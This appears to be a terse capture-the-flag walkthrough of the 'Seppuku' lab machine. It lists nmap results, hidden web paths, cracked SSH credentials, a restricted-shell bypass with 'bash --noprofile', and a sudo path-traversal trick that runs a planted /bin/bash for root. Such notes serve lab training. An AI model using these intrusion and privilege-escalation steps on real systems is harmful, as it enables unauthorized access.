----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Seppuku
# 13/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http        nginx 1.14.2
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8088/tcp open  http        LiteSpeed httpd


http://192.168.187.90:7601/
http://192.168.187.90:7601/keys/
http://192.168.187.90:7601/secret/
hostname seppuku
[22][ssh] host: 192.168.187.90   login: seppuku   password: eeyoree


seppuku@seppuku:~$ cat .passwd
12345685213456!@!@A
ssh seppuku@192.168.187.90 -t "bash --noprofile"
cd /home
cd samurai/
su samurai
12345685213456!@!@A

ssh -i id_rsa tanto@192.168.187.90 -t "bash --noprofile"

mkdir .cgi_bin
cd .cgi_bin/
echo "/bin/bash" > bin
chmod 777 bin
ls -la

sudo ../../../../../../../home/tanto/.cgi_bin/bin /tmp/*
